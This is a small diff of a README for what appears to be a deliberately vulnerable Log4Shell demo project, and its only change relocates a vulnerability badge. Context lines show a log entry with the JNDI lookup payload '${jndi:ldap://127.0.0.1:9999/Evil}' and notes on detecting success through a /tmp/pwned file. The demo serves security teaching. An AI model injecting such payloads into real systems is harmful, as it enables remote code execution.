@@ -93,8 +93,9 @@ java.vm.info=mixed mode
 20:27:49.679 [Main.main()] ERROR Main - Output:${jndi:ldap://127.0.0.1:9999/Evil}
 /tmp/pwned EXISTS - yah been pwned!
 ```
-[![Known Vulnerabilities](https://snyk.io/test/github/deepakpanda-snyk/java-goof/badge.svg?targetFile=log4shell-goof/log4shell-server/Dockerfile)](https://snyk.io/test/github/deepakpanda-snyk/java-goof?targetFile=log4shell-goof/log4shell-server/Dockerfile)
 **NOTE**: The client app will tell you if it was successful. It does some checks, including looking for the 
+
+[![Known Vulnerabilities](https://snyk.io/test/github/deepakpanda-snyk/java-goof/badge.svg?targetFile=log4shell-goof/log4shell-server/Dockerfile)](https://snyk.io/test/github/deepakpanda-snyk/java-goof?targetFile=log4shell-goof/log4shell-server/Dockerfile)
 `/tmp/pwned` file before and after the attack. You MUST delete the `/tmp/pwned` file between runs in order for the
 client app to work properly. The file not being there and then being present after the attack is how it knows it's
 been successful.
